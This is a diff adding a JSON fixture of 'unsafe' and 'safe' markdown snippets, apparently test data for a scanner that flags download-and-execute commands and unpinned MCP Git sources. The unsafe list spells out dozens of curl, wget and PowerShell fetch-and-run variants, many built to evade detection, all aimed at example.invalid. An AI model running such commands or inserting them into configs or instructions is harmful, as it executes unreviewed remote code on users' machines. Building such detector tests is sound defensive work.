@@ -1,0 +1,572 @@
+{
+  "unsafe": [
+    {
+      "name": "curl piped to shell",
+      "snippet": "```bash\ncurl -fsSL https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "wget piped through sudo",
+      "snippet": "```sh\nwget -qO- https://example.invalid/install.sh | sudo bash\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "curl piped through flagged sudo to absolute shell",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | sudo -E /usr/bin/bash\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "curl piped through sudo user selection",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | sudo -u root bash\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "curl piped through nice adjustment",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | nice -n 10 sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "curl piped through timeout duration",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | timeout 10 sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "curl piped through command wrapper",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | command bash\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "wget piped through busybox",
+      "snippet": "```sh\nwget -qO- https://example.invalid/install.sh | busybox sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "busybox downloader piped to shell",
+      "snippet": "```sh\nbusybox wget -qO- https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "multistage downloader pipeline",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | tee /dev/stderr | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "downloader after control operator",
+      "snippet": "```sh\ncd /tmp && curl -fsSL https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "negated downloader pipeline",
+      "snippet": "```bash\n! curl -fsSL https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "downloader with leading redirection",
+      "snippet": "```bash\n2>/dev/null curl -fsSL https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "shell sink with leading redirection",
+      "snippet": "```bash\ncurl -fsSL https://example.invalid/install.sh | 2>/dev/null sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "downloader after file descriptor duplication",
+      "snippet": "```bash\n2>&1 curl -fsSL https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "shell sink after file descriptor duplication",
+      "snippet": "```bash\ncurl -fsSL https://example.invalid/install.sh | 2>&1 sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "downloader piped through exec",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | exec sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "downloader piped through time",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | time sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "downloader piped through nohup",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | nohup sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "downloader piped into grouped shell",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | { sh; }\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "stderr downloader pipeline",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh |& sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "multiline stderr downloader pipeline",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh |&\n  sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "continued curl pipeline",
+      "snippet": "```shell\ncurl -fsSL https://example.invalid/install.sh \\\n  | bash\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "pipeline continued after pipe",
+      "snippet": "```shell\ncurl -fsSL https://example.invalid/install.sh |\n  sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "full PowerShell downloader names",
+      "snippet": "```powershell\nInvoke-RestMethod https://example.invalid/install.ps1 | Invoke-Expression\n```",
+      "finding": "download-to-powershell-expression"
+    },
+    {
+      "name": "download piped to absolute pwsh",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.ps1 | /usr/bin/pwsh\n```",
+      "finding": "pipe-to-powershell"
+    },
+    {
+      "name": "download piped through env to pwsh",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.ps1 | env pwsh\n```",
+      "finding": "pipe-to-powershell"
+    },
+    {
+      "name": "Windows curl executable piped to PowerShell executable",
+      "snippet": "```powershell\ncurl.exe https://example.invalid/install.ps1 | powershell.exe\n```",
+      "finding": "pipe-to-powershell"
+    },
+    {
+      "name": "Windows curl executable piped to shell",
+      "snippet": "```powershell\ncurl.exe https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "download piped to pwsh executable",
+      "snippet": "```powershell\ncurl https://example.invalid/install.ps1 | pwsh.exe\n```",
+      "finding": "pipe-to-powershell"
+    },
+    {
+      "name": "PowerShell invocation operators around executables",
+      "snippet": "```powershell\n& curl.exe https://example.invalid/install.ps1 | & pwsh.exe\n```",
+      "finding": "pipe-to-powershell"
+    },
+    {
+      "name": "PowerShell invocation operators around quoted paths",
+      "snippet": "```powershell\n& \"C:/Tools/curl.exe\" https://example.invalid/install.ps1 | & \"C:/Program Files/PowerShell/7/pwsh.exe\"\n```",
+      "finding": "pipe-to-powershell"
+    },
+    {
+      "name": "unquoted Windows executable paths",
+      "snippet": "```powershell\nC:\\Windows\\System32\\curl.exe https://example.invalid/install.ps1 | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```",
+      "finding": "pipe-to-powershell"
+    },
+    {
+      "name": "env split string invokes shell",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | env -S 'sh -s'\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "env inline split string invokes shell",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | env --split-string='sh -s'\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "env attached split string invokes shell",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | env -S'sh -s'\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "grouped downloader source",
+      "snippet": "```sh\n{ curl -fsSL https://example.invalid/install.sh; } | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "grouped shell sink",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | { cd /tmp; sh; }\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "subshell sink",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | (cd /tmp; sh)\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "grouped shell sink with trailing redirection",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | { cd /tmp; sh; } 2>/dev/null\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "unpinned Git MCP source in JSON",
+      "snippet": "```json\n{\"command\":\"uvx\",\"args\":[\"--from\",\"git+https://github.com/ast-grep/ast-grep-mcp.git\",\"ast-grep-mcp\"]}\n```",
+      "finding": "unpinned-ast-grep-mcp-git-source"
+    },
+    {
+      "name": "pipe-to-shell embedded in JSON config",
+      "snippet": "```json\n{\"command\":\"sh\",\"args\":[\"-c\",\"curl -fsSL https://example.invalid/install.sh | sh\"]}\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "pipe-to-shell in attributed JSON fence",
+      "snippet": "```json title=\"mcp.json\"\n{\"command\":\"sh\",\"args\":[\"-c\",\"curl -fsSL https://example.invalid/install.sh | sh\"]}\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "pipe-to-shell in unlabeled JSON fence",
+      "snippet": "```\n{\"command\":\"sh\",\"args\":[\"-c\",\"curl -fsSL https://example.invalid/install.sh | sh\"]}\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "pipe-to-shell in unlabeled JSONC fence",
+      "snippet": "```\n{\n  // generated config\n  \"command\": \"sh\",\n  \"args\": [\"-c\", \"curl -fsSL https://example.invalid/install.sh | sh\"],\n}\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "unpinned escaped Git MCP source in JSON",
+      "snippet": "```json\n{\"args\":[\"git+https:\\/\\/github.com\\/ast-grep\\/ast-grep-mcp.git\"]}\n```",
+      "finding": "unpinned-ast-grep-mcp-git-source"
+    },
+    {
+      "name": "unpinned Unicode-escaped Git MCP source",
+      "snippet": "```json\n{\"args\":[\"git+\\u0068ttps:\\/\\/github.com\\/ast-grep\\/ast-grep-mcp.git\"]}\n```",
+      "finding": "unpinned-ast-grep-mcp-git-source"
+    },
+    {
+      "name": "unpinned Git MCP source with explicit HTTPS port",
+      "snippet": "```toml\nsource = \"git+https://github.com:443/ast-grep/ast-grep-mcp.git\"\n```",
+      "finding": "unpinned-ast-grep-mcp-git-source"
+    },
+    {
+      "name": "unpinned shell-escaped Git MCP source",
+      "snippet": "```sh\nuvx --from git+https:\\/\\/github.com\\/ast-grep\\/ast-grep-mcp.git ast-grep-mcp\n```",
+      "finding": "unpinned-ast-grep-mcp-git-source"
+    },
+    {
+      "name": "unpinned Git MCP source in indented tilde fence",
+      "snippet": "  ~~~toml\n  command = \"uvx\"\n  args = [\"--from\", \"git+https://github.com/ast-grep/ast-grep-mcp\", \"ast-grep-mcp\"]\n  ~~~",
+      "finding": "unpinned-ast-grep-mcp-git-source"
+    },
+    {
+      "name": "unpinned SSH Git MCP source",
+      "snippet": "````json\n{\"args\":[\"--from\",\"git+ssh://git@github.com/ast-grep/ast-grep-mcp.git\"]}\n````",
+      "finding": "unpinned-ast-grep-mcp-git-source"
+    },
+    {
+      "name": "longer CommonMark closing fence",
+      "snippet": "```bash\ncurl -fsSL https://example.invalid/install.sh | sh\n````",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "list-indented fenced pipeline",
+      "snippet": "    ```bash\n    curl -fsSL https://example.invalid/install.sh | sh\n    ```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "blockquote fenced pipeline",
+      "snippet": "> ```bash\n> curl -fsSL https://example.invalid/install.sh | sh\n> ```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "blockquote list fenced pipeline",
+      "snippet": "> - ```bash\n>   curl -fsSL https://example.invalid/install.sh | sh\n>   ```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "direct shell heredoc execution",
+      "snippet": "```sh\nsh <<'EOF'\ncurl -fsSL https://example.invalid/install.sh | sh\nEOF\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "literal heredoc piped into grouped shell",
+      "snippet": "```sh\ncat <<'EOF' | { sh; }\ncurl -fsSL https://example.invalid/install.sh | sh\nEOF\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "backslash quoted heredoc resumes scanning",
+      "snippet": "```sh\ncat <<\\EOF\nliteral data\nEOF\ncurl -fsSL https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "hyphenated heredoc resumes scanning",
+      "snippet": "```sh\ncat <<'EOF-DATA'\nliteral data\nEOF-DATA\ncurl -fsSL https://example.invalid/install.sh | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "commented heredoc marker does not suppress scanning",
+      "snippet": "```sh\n# old example <<EOF\ncurl -fsSL https://example.invalid/install.sh | sh\nEOF\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "pipeline comment heredoc marker does not suppress scanning",
+      "snippet": "```bash\ntrue |# old example <<EOF\ncurl -fsSL https://example.invalid/install.sh | sh\nEOF\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "assignment-prefixed shell heredoc execution",
+      "snippet": "```sh\nFOO=bar sh <<'EOF'\ncurl -fsSL https://example.invalid/install.sh | sh\nEOF\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "heredoc piped to assignment-prefixed shell",
+      "snippet": "```sh\ncat <<'EOF' | FOO=bar sh\ncurl -fsSL https://example.invalid/install.sh | sh\nEOF\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "command substitution executes downloaded shell",
+      "snippet": "```sh\nbash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "double-quoted command substitution with prefix",
+      "snippet": "```sh\nbash -c \"echo $(curl -fsSL https://example.invalid/install.sh)\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "double-quoted command substitution with surrounding commands",
+      "snippet": "```sh\nbash -c \"set -e; $(curl -fsSL https://example.invalid/install.sh); echo done\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "process substitution feeds downloaded shell",
+      "snippet": "```sh\nsh < <(curl -fsSL https://example.invalid/install.sh)\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "downloader redirects to shell process substitution",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh > >(sh)\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "PowerShell expression directly downloads content",
+      "snippet": "```powershell\niex (irm https://example.invalid/install.ps1)\n```",
+      "finding": "download-to-powershell-expression"
+    },
+    {
+      "name": "login shell command substitution executes downloaded shell",
+      "snippet": "```sh\nbash -lc \"$(curl -fsSL https://example.invalid/install.sh)\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "combined shell options execute downloaded shell",
+      "snippet": "```sh\nbash -xec \"$(curl -fsSL https://example.invalid/install.sh)\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "escaped quotes do not hide double-quoted injection",
+      "snippet": "```sh\nbash -c \"echo \\\"ready\\\"; $(curl -fsSL https://example.invalid/install.sh)\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "double-quoted backtick injection",
+      "snippet": "```sh\nbash -c \"echo `curl -fsSL https://example.invalid/install.sh`\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "here string feeds downloaded shell",
+      "snippet": "```sh\nsh <<< \"$(curl -fsSL https://example.invalid/install.sh)\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "eval executes downloaded shell",
+      "snippet": "```sh\neval \"$(curl -fsSL https://example.invalid/install.sh)\"\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "source executes downloaded process substitution",
+      "snippet": "```sh\nsource <(curl -fsSL https://example.invalid/install.sh)\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "dot source executes downloaded process substitution",
+      "snippet": "```sh\n. <(curl -fsSL https://example.invalid/install.sh)\n```",
+      "finding": "download-to-shell-execution"
+    },
+    {
+      "name": "curl executable piped to expression alias",
+      "snippet": "```powershell\ncurl.exe https://example.invalid/install.ps1 | iex\n```",
+      "finding": "download-to-powershell-expression"
+    },
+    {
+      "name": "curl piped to full expression command",
+      "snippet": "```powershell\ncurl https://example.invalid/install.ps1 | Invoke-Expression\n```",
+      "finding": "download-to-powershell-expression"
+    },
+    {
+      "name": "doas shell wrapper",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | doas sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "sudo chroot shell wrapper",
+      "snippet": "```sh\ncurl -fsSL https://example.invalid/install.sh | sudo -R /tmp/root sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "YAML folded shell command",
+      "snippet": "```yaml\ncommand: sh\nargs:\n  - -c\n  - >\n    curl -fsSL https://example.invalid/install.sh\n    | sh\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "nested command substitution pipeline",
+      "snippet": "```sh\nprintf '%s' \"$(curl -fsSL https://example.invalid/install.sh | sh)\"\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "nested process substitution pipeline",
+      "snippet": "```sh\ncat <(curl -fsSL https://example.invalid/install.sh | sh)\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "unquoted heredoc expansion pipeline",
+      "snippet": "```sh\ncat <<EOF\n$(curl -fsSL https://example.invalid/install.sh | sh)\nEOF\n```",
+      "finding": "pipe-to-shell"
+    },
+    {
+      "name": "unclosed fenced pipeline",
+      "snippet": "```bash\ncurl -fsSL https://example.invalid/install.sh | sh",
+      "finding": "pipe-to-shell"
+    }
+  ],
+  "safe": [
+    {
+      "name": "download without execution pipeline",
+      "snippet": "```bash\ncurl -fL -o tool.tar.gz https://example.invalid/tool.tar.gz\n```"
+    },
+    {
+      "name": "pinned dot-git MCP source in TOML",
+      "snippet": "```toml\ncommand = \"uvx\"\nargs = [\"--from\", \"git+https://github.com/ast-grep/ast-grep-mcp.git@0123456789abcdef0123456789abcdef01234567\", \"ast-grep-mcp\"]\n```"
+    },
+    {
+      "name": "pinned SSH MCP source in JSON",
+      "snippet": "```json\n{\"args\":[\"--from\",\"git+ssh://git@github.com/ast-grep/ast-grep-mcp.git@0123456789abcdef0123456789abcdef01234567\"]}\n```"
+    },
+    {
+      "name": "quoted shell slash escapes remain literal",
+      "snippet": "```sh\nprintf '%s\\n' 'git+https:\\/\\/github.com\\/ast-grep\\/ast-grep-mcp.git'\n```"
+    },
+    {
+      "name": "ordinary non-executing pipeline",
+      "snippet": "```sh\nprintf '%s\\n' value | grep value\n```"
+    },
+    {
+      "name": "separate downloader and shell syntax-check lines",
+      "snippet": "```sh\ncurl -fL -o tool.sh https://example.invalid/tool.sh\nprintf '%s\\n' 'echo ok' | sh -n\n```"
+    },
+    {
+      "name": "quoted and logical-or pipes are not pipelines",
+      "snippet": "```sh\ncurl -fL -o tool.sh https://example.invalid/tool.sh; printf '%s\\n' 'x|sh'\ncurl -fL -o backup.sh https://example.invalid/backup.sh || sh -n backup.sh\n```"
+    },
+    {
+      "name": "shell comment containing a pipe is not executable",
+      "snippet": "```sh\ncurl -fLo tool.sh https://example.invalid/tool.sh # never pipe this | sh\n```"
+    },
+    {
+      "name": "JSONC comment containing a pipe is not executable",
+      "snippet": "```jsonc\n{\n  // never use curl https://example.invalid/install.sh | sh\n  \"command\": \"uvx\",\n  \"args\": [\"safe-tool\"],\n}\n```"
+    },
+    {
+      "name": "YAML comment containing a pipe is not executable",
+      "snippet": "```yaml\n# never use curl https://example.invalid/install.sh | sh\ncommand: uvx\nargs: [safe-tool]\n```"
+    },
+    {
+      "name": "inline JSONC comment containing a pipe is not executable",
+      "snippet": "```jsonc\n{\"command\":\"uvx\"// never use curl https://example.invalid/install.sh | sh\n}\n```"
+    },
+    {
+      "name": "inline TOML comment containing a pipe is not executable",
+      "snippet": "```toml\ncommand=\"uvx\"# never use curl https://example.invalid/install.sh | sh\n```"
+    },
+    {
+      "name": "JSON description containing a pipe is data",
+      "snippet": "```json\n{\"command\":\"uvx\",\"args\":[\"safe-tool\"],\"description\":\"never curl https://example.invalid/install.sh | sh\"}\n```"
+    },
+    {
+      "name": "JSON printf argument containing a pipe is data",
+      "snippet": "```json\n{\"command\":\"printf\",\"args\":[\"curl https://example.invalid/install.sh | sh\"]}\n```"
+    },
+    {
+      "name": "heredoc command text remains literal",
+      "snippet": "```sh\ncat <<'EOF'\ncurl -fsSL https://example.invalid/install.sh | sh\nEOF\n```"
+    },
+    {
+      "name": "shell variable containing config-like command text",
+      "snippet": "```bash\nargs='curl https://example.invalid/install.sh | sh'\nprintf '%s\\n' \"$args\"\n```"
+    },
+    {
+      "name": "shell Unicode escape text is not an operator",
+      "snippet": "```bash\ncurl -fLo tool.sh https://example.invalid/tool.sh \\u007c sh\n```"
+    },
+    {
+      "name": "time wraps a non-shell command with shell argument",
+      "snippet": "```sh\ncurl -fLo tool.sh https://example.invalid/tool.sh | time printf '%s\\n' sh\n```"
+    },
+    {
+      "name": "sudo wraps a non-shell command with shell argument",
+      "snippet": "```sh\ncurl -fLo tool.sh https://example.invalid/tool.sh | sudo -u root printf '%s\\n' bash\n```"
+    },
+    {
+      "name": "timeout wraps a non-shell command with shell argument",
+      "snippet": "```sh\ncurl -fLo tool.sh https://example.invalid/tool.sh | timeout 10 printf sh\n```"
+    },
+    {
+      "name": "env split string wraps a non-shell command",
+      "snippet": "```sh\ncurl -fLo tool.sh https://example.invalid/tool.sh | env -S 'printf sh'\n```"
+    },
+    {
+      "name": "ungrouped later shell is outside the pipeline",
+      "snippet": "```sh\ncurl -fLo tool.sh https://example.invalid/tool.sh | cd /tmp; sh -n tool.sh\n```"
+    },
+    {
+      "name": "shell command treats downloaded text as printf data",
+      "snippet": "```sh\nbash -c 'printf \"%s\\n\" \"$(curl -fsSL https://example.invalid/data.txt)\"'\n```"
+    },
+    {
+      "name": "shell command stores downloaded text as data",
+      "snippet": "```sh\nbash -c 'value=$(curl -fsSL https://example.invalid/data.txt); printf \"%s\" \"$value\"'\n```"
+    },
+    {
+      "name": "single-quoted inner command treats substitution as data",
+      "snippet": "```sh\nbash -c 'echo $(curl -fsSL https://example.invalid/data.txt)'\n```"
+    },
+    {
+      "name": "printed direct-execution syntax is data",
+      "snippet": "```sh\nprintf '%s\\n' 'curl https://example.invalid/install.sh > >(sh)'\n```"
+    },
+    {
+      "name": "assigned process-substitution syntax is data",
+      "snippet": "```sh\nexample='sh < <(curl https://example.invalid/install.sh)'\nprintf '%s\\n' \"$example\"\n```"
+    },
+    {
+      "name": "PowerShell prints expression syntax as data",
+      "snippet": "```powershell\nWrite-Output 'iex (irm https://example.invalid/install.ps1)'\n```"
+    },
+    {
+      "name": "PowerShell assigns expression syntax as data",
+      "snippet": "```powershell\n$example = 'iex (irm https://example.invalid/install.ps1)'\nWrite-Output $example\n```"
+    },
+    {
+      "name": "shell process substitution runs printf not downloader",
+      "snippet": "```sh\nsh < <(printf '%s' curl)\n```"
+    },
+    {
+      "name": "downloader process substitution runs printf not shell",
+      "snippet": "```sh\ncurl -o- https://example.invalid/data.txt > >(printf '%s' sh)\n```"
+    },
+    {
+      "name": "arithmetic expansion is not command substitution",
+      "snippet": "```sh\nbash -c \"$((curl))\"\n```"
+    },
+    {
+      "name": "pinned Git source with subdirectory fragment",
+      "snippet": "```toml\nsource = \"git+https://github.com/ast-grep/ast-grep-mcp.git@0123456789abcdef0123456789abcdef01234567#subdirectory=server\"\n```"
+    },
+    {
+      "name": "quoted heredoc substitution remains literal",
+      "snippet": "```sh\ncat <<'EOF'\n$(curl -fsSL https://example.invalid/install.sh | sh)\nEOF\n```"
+    }
+  ]
+}
